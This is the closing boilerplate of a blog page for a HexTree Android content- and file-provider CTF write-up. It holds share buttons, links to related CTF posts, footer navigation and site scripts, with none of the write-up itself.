</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://api.whatsapp.com/send?text=https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/&amp;resubmit=true&amp;title=HEX%20Tree%20Content%20&%20File%20providers%20Challenges" title="Share via WhatsApp" aria-label="Share via WhatsApp"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4.0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3.0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2.0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2.0-101.7 82.8-184.5 184.6-184.5 49.3.0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5.0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8s-14.3 18-17.6 21.8c-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2s-9.7 1.4-14.8 6.9c-5.1 5.6-19.4 19-19.4 46.3.0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://t.me/share/url?url=https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/&amp;resubmit=true&amp;title=HEX%20Tree%20Content%20&%20File%20providers%20Challenges" title="Share via Telegram" aria-label="Share via Telegram"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M248 8C111.033 8 0 119.033.0 256S111.033 504 248 504 496 392.967 496 256 384.967 8 248 8zM362.952 176.66c-3.732 39.215-19.881 134.378-28.1 178.3-3.476 18.584-10.322 24.816-16.948 25.425-14.4 1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25 5.342-39.5 3.652-3.793 67.107-61.51 68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608 69.142-14.845 10.194-26.894 9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7 18.45-13.7 108.446-47.248 144.628-62.3c68.872-28.647 83.183-33.623 92.511-33.789 2.052-.034 6.639.474 9.61 2.885a10.452 10.452.0 013.53 6.716A43.765 43.765.0 01362.952 176.66z"/></svg></span></a></section><h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2><section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3"><a href=/superBLog/posts/ctf/mobile/hex/hex_services/ class=min-w-full><div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative"><div class="w-full thumbnail_card_related nozoom" style=background-image:url(/superBLog/img/profile/justdoit_hu_257bd28ec3911a0f.png)></div><div class="px-6 py-4"><div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href=/superBLog/posts/ctf/mobile/hex/hex_services/>HEX Tree Services Challenges</div><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-07-30T00:55:36+03:00>30 July 2025</time><span class="px-2 text-primary-500">&#183;</span><span>1876 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">9 mins</span></div><div class="flex flex-row flex-wrap items-center"><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/ctf/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Ctf
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/andorid/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Andorid
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/services/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Services
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/hextree/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Hextree</span></span></span></div></div><div class="py-1 prose dark:prose-invert"></div></div><div class="px-6 pt-4 pb-2"></div></div></a><a href=/superBLog/posts/ctf/mobile/hex/hex_intent/ class=min-w-full><div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative"><div class="w-full thumbnail_card_related nozoom" style=background-image:url(/superBLog/img/profile/justdoit_hu_257bd28ec3911a0f.png)></div><div class="px-6 py-4"><div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href=/superBLog/posts/ctf/mobile/hex/hex_intent/>HEX Tree intent Challenges</div><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-07-30T00:55:36+03:00>30 July 2025</time><span class="px-2 text-primary-500">&#183;</span><span>3792 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">18 mins</span></div><div class="flex flex-row flex-wrap items-center"><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/ctf/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Ctf
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/andorid/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Andorid
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/intent/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Intent
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/implicit/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Implicit
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/deep-link/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Deep Link
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/pending/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Pending
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/hextree/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Hextree</span></span></span></div></div><div class="py-1 prose dark:prose-invert"></div></div><div class="px-6 pt-4 pb-2"></div></div></a><a href=/superBLog/posts/summary/providers/ class=min-w-full><div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative"><div class="w-full thumbnail_card_related nozoom" style=background-image:url(/superBLog/img/profile/justdoit_hu_257bd28ec3911a0f.png)></div><div class="px-6 py-4"><div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href=/superBLog/posts/summary/providers/>Content & File Providers</div><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-07-30T00:55:36+03:00>30 July 2025</time><span class="px-2 text-primary-500">&#183;</span><span>4742 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">23 mins</span></div><div class="flex flex-row flex-wrap items-center"><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/summary/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Summary
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/andorid/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Andorid
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/contnet-provider/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Contnet Provider
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/file-provider/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">File Provider</span></span></span></div></div><div class="py-1 prose dark:prose-invert"></div></div><div class="px-6 pt-4 pb-2"></div></div></a></section></div><script type=text/javascript src=/superBLog/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_posts/ctf/mobile/hex/hex_provider/index.md data-oid-likes=likes_posts/ctf/mobile/hex/hex_provider/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/superBLog/posts/ctf/mobile/hex/hex_intent/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">HEX Tree intent Challenges</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-07-30T00:55:36+03:00>30 July 2025</time>
</span></span></a></span><span><a class="flex text-right group ml-3" href=/superBLog/posts/first/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">First</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-07-30T00:55:36+03:00>30 July 2025</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/superBLog/tags/ title=Tags>Tags</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">Copy, _right? 🤔</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/superBLog/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://happy-joyboy.github.io/superBLog/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>